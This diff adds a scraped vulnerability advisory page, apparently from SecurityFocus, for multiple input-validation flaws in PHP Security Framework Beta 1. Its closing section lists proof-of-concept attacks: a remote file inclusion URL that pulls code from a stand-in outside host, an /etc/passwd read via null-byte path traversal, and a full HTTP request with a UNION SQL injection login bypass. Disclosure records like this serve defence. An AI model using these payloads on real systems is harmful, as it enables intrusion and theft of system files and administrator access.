@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid26898<p><b><span style="font-size: 18pt;">PHP Security Framework Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/26898/info">info</a><br><a href="http://www.securityfocus.com/bid/26898/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/26898/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/26898/solution">solution</a><br><a href="http://www.securityfocus.com/bid/26898/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				26898
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 17 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 18 2007 03:21AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				DarkFig is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Benjamin Mosse PHP Security Framework   Beta 1<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can use a browser to exploit these issues.<br/><br/>The following proofs of concept are available:<br/><br/>http://www.example.com/PSF/lib/base.inc.php?MODEL_DIR=http://www.example2.com/<br/>http://www.example.com/PSF/lib/base.inc.php?DAO_DIR=/etc/passwd%00<br/><br/>POST http://www.example.com/PSF/index.php?page=authentification HTTP/1.1\r\n<br/>Host: localhost\r\n<br/>Connection: keep-alive\r\n<br/>Content-Type: application/x-www-form-urlencoded\r\n<br/>Content-Length: &amp;lt;SIZE&amp;gt;\r\n\r\n<br/>username=8%27+union+select+CHR%2856%29%2CCHR%2857%29%2CCHR%2857%29%2CCHR%2857%29+FROM+psf_administrator-----------&amp;amp;password=9&amp;amp;page=authentification&amp;amp;button=Log+in\r\n\r\n<br/><br/>SQL-query: select * from psf_administrator WHERE username='8\\\\\\\\\\\\\\\'union select  CHR(56),CHR(57),CHR(57),CHR(57) FROM psf_administrator-----------'
+	
+		<ul>
+</ul>
+</div>
